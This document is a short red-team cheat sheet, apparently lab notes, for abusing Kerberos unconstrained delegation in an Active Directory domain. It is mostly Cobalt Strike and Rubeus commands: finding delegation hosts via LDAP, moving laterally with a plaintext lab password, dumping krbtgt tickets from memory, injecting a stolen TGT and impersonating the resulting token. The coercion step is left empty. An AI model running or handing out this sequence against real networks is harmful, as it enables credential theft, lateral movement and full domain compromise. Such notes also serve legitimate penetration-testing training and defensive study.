
Search for computers configured for Unconstrained Delegation
```powershell
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

Within SYSTEM level beacon on Unconstrained Delegation host, monitor for incoming TGTs on host
```powershell
make_token CONTOSO\rsteel Passw0rd!
jump psexec64 lon-ws-1 smb
```

> Few options here: 

1.  Perform coercion to make a high level machine (DC) connect

```powershell

```

2. Dump tickets from memory

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x6c5b5 /service:krbtgt /nowrap
```


Stop Rubeus
```powershell
jobs
jobkill 0
```

Inject TGT into sacrificial logon session
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:
```

Impersonate spawned process and confirm
```powershell
steal_token [PID]
run klist

rev2self       <--- Drop impersonation
kill [PID]
```

